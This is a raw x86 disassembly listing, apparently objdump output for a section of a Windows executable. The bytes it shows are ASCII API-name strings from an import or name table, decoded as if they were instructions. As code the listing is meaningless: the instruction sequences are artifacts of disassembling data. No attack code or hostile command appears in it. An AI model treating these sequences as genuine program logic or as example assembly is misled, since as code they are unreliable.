  428e4e:	outs   dx,DWORD PTR ds:[esi]
  428e4f:	outs   dx,BYTE PTR ds:[esi]
  428e50:	je     0x428ec4
  428e52:	outs   dx,DWORD PTR ds:[esi]
  428e53:	ins    BYTE PTR es:[edi],dx
  428e54:	add    BYTE PTR [eax],al
  428e56:	mov    dl,0x1
  428e58:	dec    esp
  428e59:	outs   dx,DWORD PTR ds:[esi]
  428e5a:	popa   
  428e5b:	fs dec ecx
  428e5d:	ins    DWORD PTR es:[edi],dx
  428e5e:	popa   
  428e5f:	addr16 gs push edi
  428e62:	add    BYTE PTR [eax],al
  428e64:	add    al,BYTE PTR [eax]
  428e66:	inc    ecx
  428e67:	fs push 0x75
  428e6a:	jae    0x428ee0
  428e6c:	push   edi
  428e6d:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  428e74:	arpl   WORD PTR [eax+eax*1+0x0],si
  428e78:	add    DWORD PTR [ecx],0x65536e49
  428e7e:	outs   dx,BYTE PTR ds:[esi]
  428e7f:	fs dec ebp
  428e81:	gs jae 0x428ef7
  428e84:	popa   
  428e85:	addr16 gs inc ebp
  428e88:	js     0x428e8a
  428e8a:	xchg   BYTE PTR [ecx],al
  428e8c:	dec    ecx
  428e8d:	outs   dx,BYTE PTR ds:[esi]
  428e8e:	jae    0x428ef5
  428e90:	jb     0x428f06
  428e92:	dec    ebp
  428e93:	outs   dx,BYTE PTR gs:[esi]
  428e95:	jne    0x428eee
  428e97:	add    BYTE PTR ds:0x6c6c4100,al
  428e9d:	outs   dx,DWORD PTR ds:[esi]
  428e9e:	ja     0x428ef3
  428ea0:	gs je  0x428ee9
  428ea3:	outs   dx,DWORD PTR ds:[esi]
  428ea4:	jb     0x428f0b
  428ea6:	addr16 jb 0x428f18
  428ea9:	jne    0x428f19
  428eab:	fs push edi
  428ead:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428eb4:	add    BYTE PTR [edx],0x53
  428eb7:	ja     0x428f1a
  428eb9:	jo     0x428f08
  428ebb:	outs   dx,DWORD PTR ds:[esi]
  428ebc:	jne    0x428f31
  428ebe:	gs inc edx
  428ec0:	jne    0x428f36
  428ec2:	je     0x428f33
  428ec4:	outs   dx,BYTE PTR ds:[esi]
  428ec5:	add    bh,ch
  428ec7:	add    DWORD PTR [eax+0x65],edx
  428eca:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  428ecf:	jae    0x428f32
  428ed1:	addr16 gs push edi
  428ed4:	add    BYTE PTR [eax],al
  428ed6:	cdq    
  428ed7:	add    BYTE PTR [ecx+ebp*2+0x61],al
  428edb:	ins    BYTE PTR es:[edi],dx
  428edc:	outs   dx,DWORD PTR ds:[esi]
  428edd:	addr16 inc edx
  428edf:	outs   dx,DWORD PTR ds:[esi]
  428ee0:	js     0x428f2b
  428ee2:	outs   dx,BYTE PTR ds:[esi]
  428ee3:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428eeb:	jb     0x428f4e
  428eed:	ins    DWORD PTR es:[edi],dx
  428eee:	inc    ecx
  428eef:	add    BYTE PTR [ebp+0x0],bl
  428ef2:	inc    ebx
  428ef3:	jb     0x428f5a
  428ef5:	popa   
  428ef6:	je     0x428f5d
  428ef8:	dec    ecx
  428ef9:	arpl   WORD PTR [edi+0x6e],bp
  428efc:	dec    ecx
  428efd:	outs   dx,BYTE PTR ds:[esi]
  428efe:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  428f06:	stos   BYTE PTR es:[edi],al
  428f07:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428f0b:	fs inc edx
  428f0d:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb1005770
  428f15:	add    dl,BYTE PTR [esi+0x6b]
  428f18:	dec    ebx
  428f19:	gs jns 0x428f6f
  428f1c:	arpl   WORD PTR [ecx+0x6e],sp
  428f1f:	push   edi
  428f20:	add    BYTE PTR [eax],al
  428f22:	adc    eax,DWORD PTR [ecx]
  428f24:	inc    edi
  428f25:	gs je  0x428f6c
  428f28:	outs   dx,DWORD PTR ds:[esi]
  428f29:	jne    0x428f8d
  428f2b:	ins    BYTE PTR es:[edi],dx
  428f2c:	gs inc ebx
  428f2e:	ins    BYTE PTR es:[edi],dx
  428f2f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  428f36:	add    BYTE PTR [eax],al
  428f38:	add    WORD PTR [edi+0x65],ax
  428f3c:	je     0x428f93
  428f3e:	jae    0x428fa5
  428f40:	jb     0x428f91
  428f42:	bound  ebp,QWORD PTR [edx+0x65]
  428f45:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428f49:	outs   dx,WORD PTR ds:[esi]
  428f4b:	jb     0x428fba
  428f4d:	popa   
  428f4e:	je     0x428fb9
  428f50:	outs   dx,DWORD PTR ds:[esi]
  428f51:	outs   dx,BYTE PTR ds:[esi]
  428f52:	push   edi
  428f53:	add    BYTE PTR [eax+0x1],bl
  428f56:	inc    edi
  428f57:	gs je  0x428fad
  428f5a:	jne    0x428fbe
  428f5c:	dec    ebp
  428f5d:	outs   dx,BYTE PTR gs:[esi]
  428f5f:	jne    0x428f61
  428f61:	add    dh,dh
  428f63:	add    BYTE PTR [edi+0x65],al
  428f66:	je     0x428fab
  428f68:	ins    BYTE PTR es:[edi],dx
  428f69:	popa   
  428f6a:	jae    0x428fdf
  428f6c:	dec    ecx
  428f6d:	outs   dx,BYTE PTR ds:[esi]
  428f6e:	outs   dx,WORD PTR ds:[esi]
  428f70:	inc    ebp
  428f71:	js     0x428fca
  428f73:	add    BYTE PTR [ecx+eax*1],cl
  428f76:	inc    edi
  428f77:	gs je  0x428fbe
  428f7a:	gs jae 0x428fe8
  428f7d:	je     0x428fee
  428f7f:	jo     0x428fd8
  428f81:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428f88:	sub    eax,0x6e655302
  428f8d:	fs dec esi
  428f8f:	outs   dx,DWORD PTR ds:[esi]
  428f90:	je     0x428ffb
  428f92:	data16 jns 0x428fe2
  428f95:	gs jae 0x42900b
  428f98:	popa   
  428f99:	addr16 gs push edi
  428f9c:	add    BYTE PTR [eax],al
  428f9e:	and    al,BYTE PTR [edx]
  428fa0:	push   ebx
  428fa1:	outs   dx,BYTE PTR gs:[esi]
  428fa3:	fs inc esp
  428fa5:	ins    BYTE PTR es:[edi],dx
  428fa6:	addr16 dec ecx
  428fa8:	je     0x42900f
  428faa:	ins    DWORD PTR es:[edi],dx
  428fab:	dec    ebp
  428fac:	gs jae 0x429022
  428faf:	popa   
  428fb0:	addr16 gs push edi
  428fb3:	add    BYTE PTR [eax],ch
  428fb5:	add    DWORD PTR [edi+0x65],eax
  428fb8:	je     0x429006
  428fba:	popa   
  428fbb:	jae    0x429031
  428fbd:	inc    ecx
  428fbe:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428fc2:	gs push eax
  428fc4:	outs   dx,DWORD PTR ds:[esi]
  428fc5:	jo     0x42903c
  428fc7:	jo     0x428fc9
  428fc9:	add    BYTE PTR [ecx],ch
  428fcb:	add    BYTE PTR [ebx+0x68],al
  428fce:	popa   
  428fcf:	jb     0x42901d
  428fd1:	outs   dx,DWORD PTR ds:[esi]
  428fd2:	ja     0x429039
  428fd4:	jb     0x42902d
  428fd6:	add    BYTE PTR [eax],al
  428fd8:	xor    al,BYTE PTR [ecx]
  428fda:	inc    edi
  428fdb:	gs je  0x42902b
  428fde:	outs   dx,BYTE PTR gs:[esi]
  428fe0:	jne    0x42902b
  428fe2:	je     0x429049
  428fe4:	ins    DWORD PTR es:[edi],dx
  428fe5:	inc    ebx
  428fe6:	outs   dx,DWORD PTR ds:[esi]
  428fe7:	jne    0x429057
  428fe9:	je     0x428feb
  428feb:	add    BYTE PTR ds:0x74655302,bh
  428ff1:	inc    esp
  428ff2:	ins    BYTE PTR es:[edi],dx
  428ff3:	addr16 dec ecx
  428ff5:	je     0x42905c
  428ff7:	ins    DWORD PTR es:[edi],dx
  428ff8:	dec    ecx
  428ff9:	outs   dx,BYTE PTR ds:[esi]
  428ffa:	je     0x428ffc
  428ffc:	mov    al,ds:0x57734901
  429001:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  429008:	mov    ds:0x57734901,al
  42900d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  429014:	imul   esp,DWORD PTR [ebx+0x6f],0xe7006564
  42901b:	add    DWORD PTR [edi+0x70],ecx
  42901e:	outs   dx,BYTE PTR gs:[esi]
  429020:	inc    esp
  429021:	gs jae 0x42908f
  429024:	je     0x429095
  429026:	jo     0x42907f
  429028:	add    BYTE PTR [eax],al
  42902a:	cmp    al,BYTE PTR [eax]
  42902c:	inc    ebx
  42902d:	push   0x446b6365
  429032:	ins    BYTE PTR es:[edi],dx
  429033:	addr16 inc edx
  429035:	jne    0x4290ab
  429037:	je     0x4290a8
  429039:	outs   dx,BYTE PTR ds:[esi]
  42903a:	add    BYTE PTR [eax],al
  42903c:	mov    eax,DWORD PTR [ecx]
  42903e:	dec    ecx
  42903f:	outs   dx,BYTE PTR ds:[esi]
  429040:	jbe    0x4290a7
  429042:	jb     0x4290b8
  429044:	push   edx
  429045:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42904a:	pop    DWORD PTR [eax]
  42904c:	inc    esp
  42904d:	gs push di
  429050:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  429057:	outs   dx,DWORD PTR ds:[esi]
  429058:	arpl   WORD PTR [edi+0x0],dx
  42905b:	add    BYTE PTR ds:0x74654701,cl
  429061:	inc    esp
  429062:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  429069:	jae    0x4290d0
  42906b:	push   ebp
  42906c:	outs   dx,BYTE PTR ds:[esi]
  42906d:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x47016500
  429075:	gs je  0x4290cd
  429078:	jae    0x4290df
  42907a:	jb     0x4290cb
  42907c:	bound  ebp,QWORD PTR [edx+0x65]
  42907f:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  429083:	outs   dx,WORD PTR ds:[esi]
  429085:	jb     0x4290f4
  429087:	popa   
  429088:	je     0x4290f3
  42908a:	outs   dx,DWORD PTR ds:[esi]
  42908b:	outs   dx,BYTE PTR ds:[esi]
  42908c:	inc    ecx
  42908d:	add    BYTE PTR [ecx+0x44734901],bl
  429093:	ins    BYTE PTR es:[edi],dx
  429094:	addr16 inc edx
  429096:	jne    0x42910c
  429098:	je     0x429109
  42909a:	outs   dx,BYTE PTR ds:[esi]
  42909b:	inc    ebx
  42909c:	push   0x656b6365
  4290a1:	add    BYTE PTR fs:[eax],al
  4290a4:	ins    DWORD PTR es:[edi],dx
  4290a5:	add    DWORD PTR [edi+0x65],eax
  4290a8:	je     0x429101
  4290aa:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4290b1:	outs   dx,BYTE PTR ds:[esi]
  4290b2:	addr16 push edi
  4290b4:	add    BYTE PTR [eax],al
  4290b6:	popa   
  4290b7:	add    BYTE PTR [ebx+0x72],al
  4290ba:	gs popa 
  4290bc:	je     0x429123
  4290be:	push   eax
  4290bf:	outs   dx,DWORD PTR ds:[esi]
  4290c0:	jo     0x429137
  4290c2:	jo     0x429111
  4290c4:	outs   dx,BYTE PTR gs:[esi]
  4290c6:	jne    0x4290c8
  4290c8:	sbb    eax,DWORD PTR [eax]
  4290ca:	inc    ebx
  4290cb:	popa   
  4290cc:	ins    BYTE PTR es:[edi],dx
  4290cd:	ins    BYTE PTR es:[edi],dx
  4290ce:	push   edi
  4290cf:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4290d6:	outs   dx,DWORD PTR ds:[esi]
  4290d7:	arpl   WORD PTR [edi+0x0],dx
  4290da:	stos   DWORD PTR es:[edi],eax
  4290db:	add    BYTE PTR [edx+esi*2+0x61],al
  4290df:	ja     0x429122
  4290e1:	outs   dx,BYTE PTR ds:[esi]
  4290e2:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  4290e9:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  4290ee:	sahf   
  4290ef:	add    DWORD PTR [ecx+0x73],ecx
  4290f2:	push   edx
  4290f3:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4290f8:	jo     0x42916e
  4290fa:	jns    0x4290fc
  4290fc:	inc    BYTE PTR [eax]
  4290fe:	inc    edi
  4290ff:	gs je  0x429145
  429102:	ins    BYTE PTR es:[edi],dx
  429103:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  42910a:	jb     0x42910c
  42910c:	lds    eax,FWORD PTR [eax]
  42910e:	inc    ebp
  42910f:	outs   dx,BYTE PTR ds:[esi]
  429110:	fs push eax
  429112:	popa   
  429113:	imul   ebp,DWORD PTR [esi+0x74],0xdc0000
  42911a:	inc    ebp
  42911b:	outs   dx,BYTE PTR ds:[esi]
  42911c:	jne    0x42918b
  42911e:	push   edi
  42911f:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  429126:	xchg   DWORD PTR [ecx],eax
  429128:	dec    ecx
  429129:	outs   dx,BYTE PTR ds:[esi]
  42912a:	je     0x429191
  42912c:	jb     0x42919c
  42912e:	popa   
  42912f:	ins    BYTE PTR es:[edi],dx
  429130:	inc    edi
  429131:	gs je  0x42918b
  429134:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  42913b:	js     0x4291b1
  42913d:	add    BYTE PTR [eax+0x43734901],dl
  429143:	push   0x6f4c7261
  429148:	ja     0x4291af
  42914a:	jb     0x42918d
  42914c:	add    BYTE PTR [eax],al
  42914e:	aad    0x1
  429150:	dec    ebp
  429151:	gs jae 0x4291c7
  429154:	popa   
  429155:	addr16 gs inc edx
  429158:	outs   dx,DWORD PTR ds:[esi]
  429159:	js     0x4291b2
  42915b:	add    BYTE PTR [edi+0x636f4c01],bh
  429161:	imul   edx,DWORD PTR [edi+0x69],0x6e
  429165:	outs   dx,DWORD PTR fs:[esi]
  429167:	ja     0x4291be
  429169:	jo     0x4291cf
  42916b:	popa   
  42916c:	je     0x4291d3
  42916e:	add    BYTE PTR [eax],al
  429170:	add    BYTE PTR es:[ebx+0x68],al
  429174:	popa   
  429175:	jb     0x4291c3
  429177:	outs   dx,DWORD PTR ds:[esi]
  429178:	ja     0x4291df
  42917a:	jb     0x4291bd
  42917c:	add    BYTE PTR [eax],al
  42917e:	call   0x6e6f:0x696e5502
  429185:	push   edx
  429186:	arpl   WORD PTR gs:[eax+eax*1+0x38],si
  42918b:	add    DWORD PTR [edi+0x65],eax
  42918e:	je     0x4291dd
  429190:	outs   dx,BYTE PTR gs:[esi]
  429192:	jne    0x4291e7
  429194:	je     0x429208
  429196:	imul   ebp,DWORD PTR [esi+0x67],0xd9000041
  42919d:	add    DWORD PTR [ebp+0x6f],ecx
  4291a0:	outs   dx,BYTE PTR ds:[esi]
  4291a1:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4291a9:	push   edx
  4291aa:	arpl   WORD PTR gs:[eax+eax*1+0x6d],si
  4291af:	add    dl,BYTE PTR [ebx+0x65]
  4291b2:	je     0x42920b
  4291b4:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4291bb:	outs   dx,BYTE PTR ds:[esi]
  4291bc:	addr16 inc ecx
  4291be:	add    BYTE PTR [eax],al
  4291c0:	or     al,0x0
  4291c2:	inc    edx
  4291c3:	imul   ebp,DWORD PTR gs:[bp+0x44],0x72656665
  4291cc:	push   edi
  4291cd:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  4291d4:	jae    0x4291d6
  4291d6:	add    BYTE PTR cs:[ebx+0x68],al
  4291da:	popa   
  4291db:	jb     0x42922d
  4291dd:	jb     0x429244
  4291df:	jbe    0x429222
  4291e1:	add    bl,bl
  4291e3:	add    DWORD PTR [ebp+0x6f],ecx
  4291e6:	jbe    0x42924d
  4291e8:	push   edi
  4291e9:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4291f0:	mov    dh,0x1
  4291f2:	dec    esp
  4291f3:	outs   dx,DWORD PTR ds:[esi]
  4291f4:	popa   
  4291f5:	fs dec ebp
  4291f7:	outs   dx,BYTE PTR gs:[esi]
  4291f9:	jne    0x42923c
  4291fb:	add    BYTE PTR [ebp+0x79656b02],bh
  429201:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  429205:	jbe    0x42926c
  429207:	outs   dx,BYTE PTR ds:[esi]
  429208:	je     0x42920a
  42920a:	pop    esp
  42920b:	add    DWORD PTR [edi+0x65],eax
  42920e:	je     0x429263
  429210:	jns    0x429285
  429212:	je     0x429279
  429214:	ins    DWORD PTR es:[edi],dx
  429215:	dec    ebp
  429216:	gs je  0x42928b
  429219:	imul   esp,DWORD PTR [ebx+0x73],0x1af0000
  429220:	dec    esp
  429221:	outs   dx,DWORD PTR ds:[esi]
  429222:	popa   
  429223:	fs dec ecx
  429225:	arpl   WORD PTR [edi+0x6e],bp
  429228:	inc    ecx
  429229:	add    BYTE PTR [ebx+0x1],al
  42922c:	inc    edi
  42922d:	gs je  0x42927e
  429230:	gs js  0x4292a7
  429233:	inc    esp
  429234:	ins    BYTE PTR es:[edi],dx
  429235:	addr16 push esp
  429237:	popa   
  429238:	bound  ecx,QWORD PTR [ecx+0x74]
  42923b:	gs ins DWORD PTR es:[edi],dx
  42923d:	add    BYTE PTR [ebx+0x61724400],dh
  429243:	ja     0x42928e
  429245:	arpl   WORD PTR [edi+0x6e],bp
  429248:	add    BYTE PTR [eax],al
  42924a:	std    
  42924b:	add    BYTE PTR [edi+0x65],al
  42924e:	je     0x429293
  429250:	ins    BYTE PTR es:[edi],dx
  429251:	imul   esp,DWORD PTR [ebp+0x6e],0x63655274
  429258:	je     0x42925a
  42925a:	add    DWORD PTR ds:[edi+0x65],eax
  42925e:	je     0x4292ad
  429260:	gs jae 0x4292d6
  429263:	popa   
  429264:	addr16 gs push edi
  429267:	add    BYTE PTR [edx+0x1],al
  42926a:	inc    edi
  42926b:	gs je  0x4292bc
  42926e:	gs js  0x4292e5
  429271:	inc    esp
  429272:	ins    BYTE PTR es:[edi],dx
  429273:	addr16 inc edi
  429275:	jb     0x4292e6
  429277:	jne    0x4292e9
  429279:	dec    ecx
  42927a:	je     0x4292e1
  42927c:	ins    DWORD PTR es:[edi],dx
  42927d:	add    BYTE PTR ds:0x6c655202,dl
  429283:	gs popa 
  429285:	jae    0x4292ec
  429287:	inc    esp
  429288:	inc    ebx
  429289:	add    BYTE PTR [ebp+0x53],dl
  42928c:	inc    ebp
  42928d:	push   edx
  42928e:	xor    esi,DWORD PTR [edx]
  429290:	cs fs ins BYTE PTR es:[edi],dx
  429293:	ins    BYTE PTR es:[edi],dx
  429294:	add    BYTE PTR [eax],al
  429296:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  42929a:	jbe    0x429301
  42929c:	inc    esi
  42929d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x71004178
  4292a5:	add    DWORD PTR [esi+0x69],eax
  4292a8:	outs   dx,BYTE PTR ds:[esi]
  4292a9:	fs push edx
  4292ab:	gs jae 0x42931d
  4292ae:	jne    0x429322
  4292b0:	arpl   WORD PTR [ebp+0x45],sp
  4292b3:	js     0x42930c
  4292b5:	add    BYTE PTR [ebx],dl
  4292b7:	add    al,0x53
  4292b9:	gs je  0x4292ff
  4292bc:	jne    0x429330
  4292be:	jb     0x429325
  4292c0:	outs   dx,BYTE PTR ds:[esi]
  4292c1:	je     0x429307
  4292c3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4292ca:	jns    0x42930d
  4292cc:	add    BYTE PTR [eax],al
  4292ce:	sub    BYTE PTR [ebx+edx*2],al
  4292d1:	gs je  0x42931c
  4292d4:	popa   
  4292d5:	outs   dx,BYTE PTR ds:[esi]
  4292d6:	fs ins BYTE PTR es:[edi],dx
  4292d8:	gs inc ebx
  4292da:	outs   dx,DWORD PTR ds:[esi]
  4292db:	jne    0x42934b
  4292dd:	je     0x4292df
  4292df:	add    BYTE PTR [ebx+0x6d6f4300],dh
  4292e5:	jo     0x429348
  4292e7:	jb     0x42934e
  4292e9:	push   ebx
  4292ea:	je     0x42935e
  4292ec:	imul   ebp,DWORD PTR [esi+0x67],0x52000041
  4292f3:	add    DWORD PTR [esi+0x69],eax
  4292f6:	ins    BYTE PTR es:[edi],dx
  4292f7:	gs push esp
  4292f9:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  429300:	arpl   WORD PTR [ecx+0x6c],sp
  429303:	inc    esi
  429304:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  42930c:	cmp    eax,DWORD PTR [ebx+edx*2]
  42930f:	gs je  0x429365
  429312:	jns    0x429387
  429314:	je     0x42937b
  429316:	ins    DWORD PTR es:[edi],dx
  429317:	push   esp
  429318:	imul   ebp,DWORD PTR [ebp+0x65],0x47018e00
  42931f:	gs je  0x429363
  429322:	inc    ebx
  429323:	push   eax
  429324:	add    BYTE PTR [eax],al
  429326:	arpl   WORD PTR [ecx],ax
  429328:	inc    esi
  429329:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  429330:	je     0x429378
  429332:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x33f0000
  42933a:	dec    esp
  42933b:	outs   dx,DWORD PTR ds:[esi]
  42933c:	popa   
  42933d:	fs dec esp
  42933f:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  429346:	add    BYTE PTR [eax],al
  429348:	push   ss
  429349:	add    DWORD PTR [ebp+0x6e],eax
  42934c:	je     0x4293b3
  42934e:	jb     0x429393
  429350:	jb     0x4293bb
  429352:	je     0x4293bd
  429354:	arpl   WORD PTR [ecx+0x6c],sp
  429357:	push   ebx
  429358:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  42935d:	outs   dx,BYTE PTR ds:[esi]
  42935e:	add    BYTE PTR [eax],al
  429360:	cdq    
  429361:	add    DWORD PTR [edi+0x65],eax
  429364:	je     0x4293a9
  429366:	outs   dx,DWORD PTR ds:[esi]
  429367:	ins    DWORD PTR es:[edi],dx
  429368:	ins    DWORD PTR es:[edi],dx
  429369:	inc    ebx
  42936a:	outs   dx,DWORD PTR ds:[esi]
  42936b:	outs   dx,BYTE PTR ds:[esi]
  42936c:	imul   sp,WORD PTR [edi+0x0],0x188
  429372:	inc    esi
  429373:	jb     0x4293da
  429375:	gs push edx
  429377:	gs jae 0x4293e9
  42937a:	jne    0x4293ee
  42937c:	arpl   WORD PTR [ebp+0x0],sp
  42937f:	add    BYTE PTR [eax+0x1],ah
  429382:	inc    esi
  429383:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  42938a:	je     0x4293d2
  42938c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x1930000
  429394:	inc    edi
  429395:	gs je  0x4293da
  429398:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  42939f:	jo     0x429406
  4293a1:	push   edi
  4293a2:	add    BYTE PTR [eax],al
  4293a4:	fiadd  WORD PTR [esp+ebp*2]
  4293a7:	jae    0x42941d
  4293a9:	jb     0x429417
  4293ab:	outs   dx,BYTE PTR gs:[esi]
  4293ad:	push   edi
  4293ae:	add    BYTE PTR [eax],al
  4293b0:	pop    ds
  4293b1:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4293b5:	popa   
  4293b6:	ins    BYTE PTR es:[edi],dx
  4293b7:	push   ebx
  4293b8:	imul   edi,DWORD PTR [edx+0x65],0x47025700
  4293bf:	gs je  0x429415
  4293c2:	jns    0x429437
  4293c4:	je     0x42942b
  4293c6:	ins    DWORD PTR es:[edi],dx
  4293c7:	inc    esp
  4293c8:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4293cf:	jns    0x429412
  4293d1:	add    BYTE PTR [esi+0x74654701],ah
  4293d7:	inc    ebx
  4293d8:	outs   dx,DWORD PTR ds:[esi]
  4293d9:	ins    DWORD PTR es:[edi],dx
  4293da:	jo     0x429451
  4293dc:	je     0x429443
  4293de:	jb     0x42942e
  4293e0:	popa   
  4293e1:	ins    DWORD PTR es:[edi],dx
  4293e2:	gs push edi
  4293e4:	add    BYTE PTR [eax],al
  4293e6:	rol    BYTE PTR [eax],cl
  4293e8:	inc    ebx
  4293e9:	jb     0x429450
  4293eb:	popa   
  4293ec:	je     0x429453
  4293ee:	inc    esi
  4293ef:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4293f7:	outs   dx,BYTE PTR ds:[esi]
  4293f8:	addr16 inc ecx
  4293fa:	add    BYTE PTR [eax],al
  4293fc:	retf   0x4300
  4293ff:	jb     0x429466
  429401:	popa   
  429402:	je     0x429469
  429404:	inc    esp
  429405:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42940c:	jns    0x429465
  42940e:	add    BYTE PTR [eax],al
  429410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429411:	add    BYTE PTR [ebx+0x61],al
  429414:	outs   dx,BYTE PTR ds:[esi]
  429415:	arpl   WORD PTR [ebp+0x6c],sp
  429418:	push   edi
  429419:	popa   
  42941a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  429422:	ins    DWORD PTR es:[edi],dx
  429423:	gs jb  0x429426
  429426:	add    al,0x2
  429428:	inc    edi
  429429:	gs je  0x429478
  42942c:	outs   dx,DWORD PTR ds:[esi]
  42942d:	arpl   WORD PTR [ecx+0x6c],sp
  429430:	gs dec ecx
  429432:	outs   dx,BYTE PTR ds:[esi]
  429433:	outs   dx,WORD PTR ds:[esi]
  429435:	inc    ecx
  429436:	add    BYTE PTR [eax],al
  429438:	xor    eax,0x766f4d03
  42943d:	gs inc esi
  42943f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47019d00
  429447:	gs je  0x42948d
  42944a:	outs   dx,DWORD PTR ds:[esi]
  42944b:	ins    DWORD PTR es:[edi],dx
  42944c:	ins    DWORD PTR es:[edi],dx
  42944d:	push   ebx
  42944e:	je     0x4294b1
  429450:	je     0x4294b7
  429452:	add    BYTE PTR [eax],al
  429454:	mov    ah,0x3
  429456:	push   edx
  429457:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x61577265
  429460:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  429468:	ins    BYTE PTR es:[di],dx
  42946a:	gs dec edi
  42946c:	bound  ebp,QWORD PTR [edx+0x65]
  42946f:	arpl   WORD PTR [eax+eax*1+0x5d],si
  429473:	add    al,BYTE PTR [edi+0x65]
  429476:	je     0x4294cb
  429478:	jns    0x4294ed
  42947a:	je     0x4294e1
  42947c:	ins    DWORD PTR es:[edi],dx
  42947d:	push   esp
  42947e:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  429485:	jae    0x4294fb
  429487:	ins    DWORD PTR es:[edi],dx
  429488:	outs   dx,BYTE PTR gs:[esi]
  42948a:	je     0x42948c
  42948c:	add    al,0x1
  42948e:	inc    esp
  42948f:	gs ins BYTE PTR es:[edi],dx
  429491:	gs je  0x4294f9
  429494:	inc    esi
  429495:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47024900
  42949d:	gs je  0x4294f3
  4294a0:	push   0x5074726f
  4294a5:	popa   
  4294a6:	je     0x429510
  4294a8:	dec    esi
  4294a9:	popa   
  4294aa:	ins    DWORD PTR es:[edi],dx
  4294ab:	gs inc ecx
  4294ad:	add    BYTE PTR [edx],al
  4294af:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  4294b3:	gs je  0x42951b
  4294b6:	inc    ebx
  4294b7:	jb     0x429522
  4294b9:	je     0x429524
  4294bb:	arpl   WORD PTR [ecx+0x6c],sp
  4294be:	push   ebx
  4294bf:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4294c4:	outs   dx,BYTE PTR ds:[esi]
  4294c5:	add    bl,ah
  4294c7:	add    BYTE PTR [ebx+0x72],al
  4294ca:	gs popa 
  4294cc:	je     0x429533
  4294ce:	dec    esi
  4294cf:	popa   
  4294d0:	ins    DWORD PTR es:[edi],dx
  4294d1:	gs fs push eax
  4294d4:	imul   esi,DWORD PTR [eax+0x65],0xd4000057
  4294db:	add    cl,BYTE PTR [ecx+0x73]
  4294de:	inc    edx
  4294df:	popa   
  4294e0:	fs push edx
  4294e2:	gs popa 
  4294e4:	fs push eax
  4294e6:	je     0x42955a
  4294e8:	add    BYTE PTR [eax],al
  4294ea:	jnp    0x4294ee
  4294ec:	inc    edi
  4294ed:	gs je  0x429545
  4294f0:	jae    0x429557
  4294f2:	jb     0x429538
  4294f4:	gs popaw 
  4294f7:	jne    0x429565
  4294f9:	je     0x429547
  4294fb:	inc    ebx
  4294fc:	dec    ecx
  4294fd:	inc    esp
  4294fe:	add    BYTE PTR [eax],al
  429500:	inc    ebp
  429501:	add    al,BYTE PTR [edi+0x65]
  429504:	je     0x429556
  429506:	jb     0x429577
  429508:	arpl   WORD PTR [ecx+0x64],ax
  42950b:	fs jb  0x429573
  42950e:	jae    0x429583
  429510:	add    BYTE PTR [eax],al
  429512:	mov    BYTE PTR [ebx],0x52
  429515:	gs jae 0x42957d
  429518:	je     0x42955f
  42951a:	jbe    0x429581
  42951c:	outs   dx,BYTE PTR ds:[esi]
  42951d:	je     0x42951f
  42951f:	add    BYTE PTR [edx+0x656c4300],ch
  429525:	popa   
  429526:	jb     0x42956b
  429528:	outs   dx,DWORD PTR ds:[esi]
  429529:	ins    DWORD PTR es:[edi],dx
  42952a:	ins    DWORD PTR es:[edi],dx
  42952b:	inc    ebp
  42952c:	jb     0x4295a0
  42952e:	outs   dx,DWORD PTR ds:[esi]
  42952f:	jb     0x429531
  429531:	add    BYTE PTR [eax+0x61654802],bh
  429537:	jo     0x42958e
